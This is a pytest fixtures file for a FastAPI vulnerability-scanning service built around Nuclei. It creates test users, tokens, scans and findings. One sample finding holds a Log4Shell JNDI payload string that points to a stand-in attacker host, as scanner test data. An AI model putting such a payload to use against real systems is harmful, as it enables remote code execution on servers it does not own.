"""
pytest fixtures shared across all tests.

Uses SQLite in-memory database via aiosqlite for unit tests — no PostgreSQL required.
FastAPI app is overridden to use the test engine/session via dependency injection.
"""
import os
import uuid
import pytest
import pytest_asyncio
from datetime import datetime, timedelta
from httpx import AsyncClient, ASGITransport
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
from sqlalchemy.orm import Session
from sqlalchemy import create_engine

# Patch settings BEFORE importing app modules
os.environ.setdefault("DATABASE_URL", "sqlite:///./test.db")
os.environ.setdefault("ASYNC_DATABASE_URL", "sqlite+aiosqlite:///./test.db")
os.environ.setdefault("SECRET_KEY", "test-secret-key-that-is-32-chars-long!!!")
os.environ.setdefault("CELERY_BROKER_URL", "memory://")
os.environ.setdefault("CELERY_RESULT_BACKEND", "cache+memory://")
os.environ.setdefault("REDIS_URL", "redis://localhost:6379/0")
os.environ.setdefault("NUCLEI_BINARY", "/usr/local/bin/nuclei")

from app.database import Base, get_db
from app.main import app
from app.models.user import User, UserRole
from app.models.scan import Scan, ScanStatus
from app.models.finding import Finding, FindingSeverity
from app.models.target import Target, TargetList, TargetType
from app.core.security import get_password_hash, create_access_token, generate_api_key

# ── Test database setup ────────────────────────────────────────────────────────

TEST_DATABASE_URL = "sqlite+aiosqlite:///:memory:"

test_engine = create_async_engine(TEST_DATABASE_URL, echo=False)
TestSessionLocal = async_sessionmaker(
    test_engine, class_=AsyncSession, expire_on_commit=False
)


async def override_get_db():
    async with TestSessionLocal() as session:
        try:
            yield session
        except Exception:
            await session.rollback()
            raise


app.dependency_overrides[get_db] = override_get_db


@pytest_asyncio.fixture(autouse=True, scope="function")
async def setup_database():
    """Create all tables before each test, drop after."""
    async with test_engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield
    async with test_engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)


@pytest_asyncio.fixture
async def db() -> AsyncSession:
    async with TestSessionLocal() as session:
        yield session


@pytest_asyncio.fixture
async def async_client() -> AsyncClient:
    """httpx AsyncClient wired to the FastAPI test app."""
    async with AsyncClient(
        transport=ASGITransport(app=app), base_url="http://testserver"
    ) as client:
        yield client


# ── User fixtures ──────────────────────────────────────────────────────────────

def _make_user(role: UserRole, email_prefix: str) -> User:
    return User(
        id=str(uuid.uuid4()),
        email=f"{email_prefix}@test.local",
        hashed_password=get_password_hash("testpass123"),
        full_name=f"Test {role.value}",
        role=role,
        is_active=True,
        api_key=generate_api_key(),
    )


@pytest_asyncio.fixture
async def admin_user(db: AsyncSession) -> User:
    user = _make_user(UserRole.ADMIN, "admin")
    db.add(user)
    await db.commit()
    await db.refresh(user)
    return user


@pytest_asyncio.fixture
async def analyst_user(db: AsyncSession) -> User:
    user = _make_user(UserRole.ANALYST, "analyst")
    db.add(user)
    await db.commit()
    await db.refresh(user)
    return user


@pytest_asyncio.fixture
async def viewer_user(db: AsyncSession) -> User:
    user = _make_user(UserRole.VIEWER, "viewer")
    db.add(user)
    await db.commit()
    await db.refresh(user)
    return user


# ── Token fixtures ─────────────────────────────────────────────────────────────

def _token_for(user: User) -> str:
    return create_access_token({"sub": user.id, "role": user.role})


def _expired_token_for(user: User) -> str:
    return create_access_token(
        {"sub": user.id, "role": user.role},
        expires_delta=timedelta(minutes=-5),
    )


@pytest.fixture
def admin_token(admin_user: User) -> str:
    return _token_for(admin_user)


@pytest.fixture
def analyst_token(analyst_user: User) -> str:
    return _token_for(analyst_user)


@pytest.fixture
def viewer_token(viewer_user: User) -> str:
    return _token_for(viewer_user)


@pytest.fixture
def expired_token(analyst_user: User) -> str:
    return _expired_token_for(analyst_user)


# ── Auth header helpers ────────────────────────────────────────────────────────

@pytest.fixture
def admin_headers(admin_token: str) -> dict:
    return {"Authorization": f"Bearer {admin_token}"}


@pytest.fixture
def analyst_headers(analyst_token: str) -> dict:
    return {"Authorization": f"Bearer {analyst_token}"}


@pytest.fixture
def viewer_headers(viewer_token: str) -> dict:
    return {"Authorization": f"Bearer {viewer_token}"}


@pytest.fixture
def expired_headers(expired_token: str) -> dict:
    return {"Authorization": f"Bearer {expired_token}"}


# ── Data fixtures ──────────────────────────────────────────────────────────────

@pytest_asyncio.fixture
async def target_list(analyst_user: User, db: AsyncSession) -> TargetList:
    tl = TargetList(
        id=str(uuid.uuid4()),
        name="Test List",
        owner_id=analyst_user.id,
    )
    db.add(tl)
    t = Target(
        id=str(uuid.uuid4()),
        value="https://example.com",
        type=TargetType.URL,
        tags=[],
        owner_id=analyst_user.id,
    )
    db.add(t)
    tl.targets.append(t)
    await db.commit()
    await db.refresh(tl)
    return tl


@pytest_asyncio.fixture
async def test_scan(analyst_user: User, target_list: TargetList, db: AsyncSession) -> Scan:
    from app.models.scan import ScanTargetList
    scan = Scan(
        id=str(uuid.uuid4()),
        name="Test Scan",
        status=ScanStatus.DONE,
        owner_id=analyst_user.id,
        config={"severity": ["critical", "high"], "rate_limit": 50},
        total_targets=1,
        total_findings=2,
        critical_count=1,
        high_count=1,
    )
    db.add(scan)
    await db.flush()
    db.add(ScanTargetList(scan_id=scan.id, target_list_id=target_list.id))
    await db.commit()
    await db.refresh(scan)
    return scan


@pytest_asyncio.fixture
async def test_finding(test_scan: Scan, db: AsyncSession) -> Finding:
    finding = Finding(
        id=str(uuid.uuid4()),
        scan_id=test_scan.id,
        template_id="cve-2021-44228",
        template_name="Apache Log4j RCE",
        severity=FindingSeverity.CRITICAL,
        matched_at="https://example.com/",
        target="https://example.com",
        host="example.com",
        description="Log4Shell vulnerability",
        extracted_results=["jndi:ldap://attacker.com/exploit"],
        reference=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        tags=["cve", "rce", "log4j"],
        raw={"template-id": "cve-2021-44228"},
    )
    db.add(finding)
    await db.commit()
    await db.refresh(finding)
    return finding
